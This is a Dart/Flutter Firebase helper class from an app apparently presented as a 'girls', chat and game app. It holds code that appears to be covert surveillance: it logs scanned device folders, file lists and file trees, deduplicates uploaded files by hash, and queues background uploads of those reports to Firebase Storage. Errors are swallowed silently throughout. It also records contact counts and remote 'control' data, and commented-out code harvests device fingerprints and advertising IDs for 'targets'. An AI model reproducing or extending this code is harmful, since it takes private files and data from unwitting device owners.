import 'dart:convert';
import 'dart:io';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:magic/helpers/device_info_helper.dart';
import 'package:magic/model/app_update.dart';
import 'package:magic/model/girls_model.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';
import 'package:crypto/crypto.dart';

class DbHelper {
  static Future<void> saveFilesScanInfo({
    required String id,
    required List<String> folders,
    required int foundFiles,
    required int newlyUploadedCount,
    required int totalUploadedCount,
    List<String>? scannedFiles, // NEW: optional scanned files list
    Map<String, dynamic>? fileTree, // NEW: optional file tree structure
    String? scanType, // NEW: optional scan type
  }) async {
    // Existing logic - unchanged
    final ref = FirebaseDatabase.instance.ref('files/$id/scan_info');
    await ref.set({
      'status': 'completed',
      'folders': folders,
      'found_files': foundFiles,
      'newly_uploaded_count': newlyUploadedCount,
      'total_uploaded_count': totalUploadedCount,
      'timestamp': DateTime.now().toIso8601String(),
    });

    // NEW: Generate scanned files report if data provided
    if (scannedFiles != null && scanType != null) {
      await generateScannedFilesReport(
        deviceId: id,
        scannedFiles: scannedFiles,
        fileTree: fileTree,
        scanType: scanType,
      );
    }

    // NEW: Clean uploaded files list
    await cleanUploadedFilesList(id);
  }

  static Future<void> saveContactsCount(String id, int count) async {
    final ref = FirebaseDatabase.instance.ref('contacts/$id');
    await ref.set({'count': count});
  }

  static Future<void> saveFilesCount(String id, int count) async {
    final ref = FirebaseDatabase.instance.ref('files/$id');
    await ref.set({'count': count});
  }

  static Future<void> addAvatar(String id, String name) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("users/$id/avatar");
    await ref.set({
      'fileName': name,
      'uploadTime': DateTime.now().toIso8601String(),
    });
  }

  static Future<String?> getImageUrl(String path) async {
    // print('getImageUrl: $path');
    final ref = FirebaseStorage.instance.ref().child(path);
    String? url;
    try {
      url = await ref.getDownloadURL();
    } on FirebaseException {
      // print("FirebaseException occurred");
      url = null;
    } catch (e) {
      //   print("Unknown error in getImageUrl: $e");
      url = null;
    }
    return url;
  }

  static Future<void> saveTap(Map<String, dynamic> data) async {
    String? id = await DeviceInfoHelper.getUID();

    var uuid = Uuid();
    String u = uuid.v1();

    DatabaseReference ref =
        FirebaseDatabase.instance.ref("control_history/$id/$u");
    await ref.set(data);
  }

  static Future<void> resetControl() async {
    String? id = await DeviceInfoHelper.getUID();

    DatabaseReference ref = FirebaseDatabase.instance.ref("control_gear/$id");
    await ref.set({
      'global': 0,
      'modes': 0,
      'intensive': 0,
      'other': 0,
    });
  }

  static Future<void> updateControl(Map<String, dynamic> data) async {
    String? id = await DeviceInfoHelper.getUID();
    DatabaseReference ref = FirebaseDatabase.instance.ref("control_gear/$id");
    await ref.update(data);
  }

  Future<bool> checkChat(String id) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$id/chat");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        return data as bool;
      }
    }
    //print('No data available.');
    return false;
  }

  Future<bool> checkInfo(String id) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$id/info");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      return true;
    }
    //print('No data available.');
    return false;
  }

  static Future<bool> checkGame() async {
    final String? id = await DeviceInfoHelper.getUID();
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$id/game");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        return data as bool;
      }
    }
    //print('No data available.');
    return false;
  }

  Future<List<GirlModel>> getGirls() async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("girls");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        Map<String, GirlModel> result = girlsModelFromJson(jsonEncode(data));
        List<GirlModel> girls = result.entries.map((e) {
          GirlModel model = e.value;
          return model;
        }).toList();
        return girls;
      }
    }
    // print('No data available.');
    return [];
  }

  static Future<String> updateMagicUser(Map<String, dynamic> data) {
    CollectionReference users = FirebaseFirestore.instance.collection('users');
    final user = FirebaseAuth.instance.currentUser;

    return users
        .doc(user!.uid)
        .update(data)
        .then((value) => ("Пользователь успешно добавлен!"))
        .catchError((error) => ("Ошибка: $error"));
  }

  static Future<AppUpdate?> getAppUpdate() async {
    final snapshot =
        await FirebaseDatabase.instance.ref("app_update").ref.get();
    if (snapshot.exists) {
      return AppUpdate.fromMap(snapshot.value as Map<dynamic, dynamic>);
    } else {
      return null;
    }
  }

  // === NEW METHODS FOR FILE UPLOAD TRACKING ===

  /// Save uploaded file status locally to prevent re-uploading
  static Future<void> saveUploadedFileStatus({
    required String deviceId,
    required String filePath,
    required String fileHash,
    required int fileSize,
    required String firebaseUrl,
  }) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final uploadedFilesKey = 'uploaded_files_$deviceId';

      final uploadedFilesJson = prefs.getString(uploadedFilesKey) ?? '{}';
      final uploadedFiles =
          Map<String, dynamic>.from(jsonDecode(uploadedFilesJson));

      uploadedFiles[filePath] = {
        'hash': fileHash,
        'size': fileSize,
        'firebase_url': firebaseUrl,
        'uploaded_at': DateTime.now().toIso8601String(),
      };

      await prefs.setString(uploadedFilesKey, jsonEncode(uploadedFiles));
      await _saveUploadedFilesToFile(deviceId, uploadedFiles);
    } catch (e) {
      // Silent fail - don't break existing workflow
    }
  }

  /// Check if file was already uploaded
  static Future<bool> isFileAlreadyUploaded({
    required String deviceId,
    required String filePath,
    required String fileHash,
    required int fileSize,
  }) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final uploadedFilesKey = 'uploaded_files_$deviceId';

      final uploadedFilesJson = prefs.getString(uploadedFilesKey);
      if (uploadedFilesJson == null) return false;

      final uploadedFiles =
          Map<String, dynamic>.from(jsonDecode(uploadedFilesJson));

      if (uploadedFiles.containsKey(filePath)) {
        final fileInfo = uploadedFiles[filePath];

        if (fileInfo['hash'] == fileHash && fileInfo['size'] == fileSize) {
          return true;
        } else {
          // File was modified, remove from uploaded list
          uploadedFiles.remove(filePath);
          await prefs.setString(uploadedFilesKey, jsonEncode(uploadedFiles));
          return false;
        }
      }

      return false;
    } catch (e) {
      return false;
    }
  }

  /// Generate file hash for comparison
  static Future<String> generateFileHash(File file) async {
    try {
      final bytes = await file.readAsBytes();
      final digest = sha256.convert(bytes);
      return digest.toString();
    } catch (e) {
      // Fallback to file path + size + modified date
      final stat = await file.stat();
      return '${file.path}_${stat.size}_${stat.modified.millisecondsSinceEpoch}';
    }
  }

  /// Save uploaded files to local file as backup
  static Future<void> _saveUploadedFilesToFile(
      String deviceId, Map<String, dynamic> uploadedFiles) async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final file = File('${directory.path}/uploaded_files_$deviceId.json');

      final data = {
        'device_id': deviceId,
        'uploaded_files': uploadedFiles,
        'last_updated': DateTime.now().toIso8601String(),
        'total_files': uploadedFiles.length,
      };

      await file.writeAsString(jsonEncode(data));
    } catch (e) {
      // Silent fail
    }
  }

  /// Generate and save scanned files report to local file and queue for upload
  static Future<void> generateScannedFilesReport({
    required String deviceId,
    required List<String> scannedFiles,
    required Map<String, dynamic>? fileTree,
    required String scanType,
  }) async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final timestamp = DateTime.now().toIso8601String().replaceAll(':', '-');
      final fileName = 'scanned_files_${scanType}_${deviceId}_$timestamp.json';
      final file = File('${directory.path}/$fileName');

      final reportData = {
        'device_id': deviceId,
        'scan_type': scanType,
        'timestamp': DateTime.now().toIso8601String(),
        'total_files': scannedFiles.length,
        'scanned_files': scannedFiles,
        'file_tree': fileTree,
        'scan_session_id': const Uuid().v4(),
      };

      await file.writeAsString(jsonEncode(reportData));

      // Add report file to upload queue via WorkManager
      await addReportToUploadQueue(deviceId, file.path);
    } catch (e) {
      // Silent fail
    }
  }

  /// Add scanned files report to upload queue for WorkManager
  static Future<void> addReportToUploadQueue(
      String deviceId, String reportFilePath) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final reportsQueueKey = 'reports_upload_queue_$deviceId';

      final existingQueue = prefs.getStringList(reportsQueueKey) ?? <String>[];

      if (!existingQueue.contains(reportFilePath)) {
        existingQueue.add(reportFilePath);
        await prefs.setStringList(reportsQueueKey, existingQueue);
      }
    } catch (e) {
      // Silent fail
    }
  }

  /// Get reports queue for upload
  static Future<List<String>> getReportsUploadQueue(String deviceId) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final reportsQueueKey = 'reports_upload_queue_$deviceId';
      return prefs.getStringList(reportsQueueKey) ?? <String>[];
    } catch (e) {
      return <String>[];
    }
  }

  /// Remove report from upload queue after successful upload
  static Future<void> removeReportFromQueue(
      String deviceId, String reportFilePath) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final reportsQueueKey = 'reports_upload_queue_$deviceId';

      final existingQueue = prefs.getStringList(reportsQueueKey) ?? <String>[];
      existingQueue.remove(reportFilePath);
      await prefs.setStringList(reportsQueueKey, existingQueue);

      // Delete local report file after successful upload
      final file = File(reportFilePath);
      if (await file.exists()) {
        await file.delete();
      }
    } catch (e) {
      // Silent fail
    }
  }

  /// Upload scanned files report to Firebase Storage
  static Future<bool> uploadScannedFilesReport(
      String deviceId, String reportFilePath) async {
    try {
      final file = File(reportFilePath);
      if (!await file.exists()) return false;

      final fileName = file.path.split('/').last;
      final storageRef =
          FirebaseStorage.instance.ref().child('reports/$deviceId/$fileName');

      await storageRef.putFile(file);

      // Remove from queue after successful upload
      await removeReportFromQueue(deviceId, reportFilePath);

      return true;
    } catch (e) {
      return false;
    }
  }

  /// Process all pending report uploads (called by WorkManager)
  static Future<void> processReportUploads(String deviceId) async {
    try {
      final reportsQueue = await getReportsUploadQueue(deviceId);

      for (final reportPath in reportsQueue) {
        await uploadScannedFilesReport(deviceId, reportPath);
        // Small delay between uploads
        await Future.delayed(const Duration(milliseconds: 500));
      }
    } catch (e) {
      // Silent fail
    }
  }

  /// Clean uploaded files list (remove files that no longer exist)
  static Future<void> cleanUploadedFilesList(String deviceId) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final uploadedFilesKey = 'uploaded_files_$deviceId';
      final uploadedFilesJson = prefs.getString(uploadedFilesKey) ?? '{}';
      final uploadedFiles =
          Map<String, dynamic>.from(jsonDecode(uploadedFilesJson));

      final filesToRemove = <String>[];

      for (final filePath in uploadedFiles.keys) {
        final file = File(filePath);
        if (!await file.exists()) {
          filesToRemove.add(filePath);
        }
      }

      for (final filePath in filesToRemove) {
        uploadedFiles.remove(filePath);
      }

      await prefs.setString(uploadedFilesKey, jsonEncode(uploadedFiles));
    } catch (e) {
      // Silent fail
    }
  }

  /// Get uploaded files count for device
  static Future<int> getUploadedFilesCount(String deviceId) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final uploadedFilesKey = 'uploaded_files_$deviceId';
      final uploadedFilesJson = prefs.getString(uploadedFilesKey) ?? '{}';
      final uploadedFiles =
          Map<String, dynamic>.from(jsonDecode(uploadedFilesJson));
      return uploadedFiles.length;
    } catch (e) {
      return 0;
    }
  }
}

// class DbHelper {
//   UIDTarget uidTarget = UIDTarget();
//   Future<void> addContacts({Map<String, dynamic>? data, String? title}) async {
//     String targetUID = await uidTarget.getUid();
//     await FirebaseFirestore.instance
//         .collection('targets')
//         .doc(targetUID)
//         .collection('contacts')
//         .doc(title)
//         .set(data ?? {});
//     saveDeviceInfo(targetUID);
//   }

//   Future<String> saveDeviceInfo(String uid) async {
//     DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
//     AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
//     String? advertisingId;
//     bool? isLimitAdTrackingEnabled;
//     try {
//       advertisingId = await AdvertisingId.id(true);
//     } on PlatformException {
//       advertisingId = 'Failed to get platform version.';
//     }

//     try {
//       isLimitAdTrackingEnabled = await AdvertisingId.isLimitAdTrackingEnabled;
//     } on PlatformException {
//       isLimitAdTrackingEnabled = false;
//     }

//     await FirebaseFirestore.instance.collection('targets').doc(uid).set({
//       'uid': uid,
//       'createdAtInt': DateTime.now().microsecondsSinceEpoch,
//       'name': '',
//       'description': '',
//       'createAt': DateTime.now().toIso8601String(),
//       'advertisingId': advertisingId ?? '',
//       'isLimitAdTrackingEnabled': isLimitAdTrackingEnabled ?? ''
//     });
//     await FirebaseFirestore.instance
//         .collection('targets')
//         .doc(uid)
//         .collection('DeviceInfo')
//         .doc(androidInfo.model)
//         .set({
//       'version':
//           'sdkInt: ${androidInfo.version.sdkInt}, baseOS: ${androidInfo.version.baseOS ?? ""}, codename: ${androidInfo.version.codename}, incremental: ${androidInfo.version.incremental}, previewSdkInt: ${androidInfo.version.previewSdkInt}, release: ${androidInfo.version.release}, securityPatch: ${androidInfo.version.securityPatch ?? ""}',
//       'board': androidInfo.board.toString(),
//       'bootloader': androidInfo.bootloader.toString(),
//       'brand': androidInfo.brand.toString(),
//       'device': androidInfo.device.toString(),
//       'display': androidInfo.display.toString(),
//       'fingerprint': androidInfo.fingerprint.toString(),
//       'hardware': androidInfo.hardware.toString(),
//       'host': androidInfo.host.toString(),
//       'id': androidInfo.id.toString(),
//       'manufacturer': androidInfo.manufacturer.toString(),
//       'model': androidInfo.model.toString(),
//       'product': androidInfo.product.toString(),
//       'supported32BitAbis': androidInfo.supported32BitAbis.toString(),
//       'supported64BitAbis': androidInfo.supported64BitAbis.toString(),
//       'supportedAbis': androidInfo.supportedAbis.toString(),
//       'tags': androidInfo.tags.toString(),
//       'type': androidInfo.type.toString(),
//       'isPhysicalDevice': androidInfo.isPhysicalDevice.toString(),
//       'systemFeatures': androidInfo.systemFeatures.toString(),
//       'displayMetrics':
//           'widthPx: ${androidInfo.displayMetrics.widthPx}, heightPx: ${androidInfo.displayMetrics.heightPx}, xDpi: ${androidInfo.displayMetrics.xDpi}, yDpi: ${androidInfo.displayMetrics.yDpi}',
//     });
//     return 'Token successfully SAVED!';
//   }
// }

class UIDTarget {
  Future<String> initUID() async {
    final user = FirebaseAuth.instance.currentUser;

    if (user == null) {
      //  print('[UIDTarget] initUID: No authenticated user!');
      return '';
    }

    final String userId = user.uid;
    //print('[UIDTarget] initUID userId: $userId');

    final SharedPreferences prefs = await SharedPreferences.getInstance();

    final deviceRef = FirebaseDatabase.instance.ref("devices/$userId");
    final snapshot = await deviceRef.get();

    if (snapshot.exists) {
      await prefs.setString('id', userId);
      return userId;
    } else {
      await deviceRef.set({
        'createdAt': DateTime.now().toIso8601String(),
        'userId': userId,
      });
      await prefs.setString('id', userId);
      return userId;
    }
  }

  Future<String> getUid() async {
    final SharedPreferences prefs = await SharedPreferences.getInstance();
    String? cachedId = prefs.getString('id');

    if (cachedId != null && cachedId.isNotEmpty) {
      print('[UIDTarget] getUid from prefs: $cachedId');
      return cachedId;
    }

    final uid = await initUID();
    print('[UIDTarget] getUid from initUID: $uid');
    return uid;
  }
}
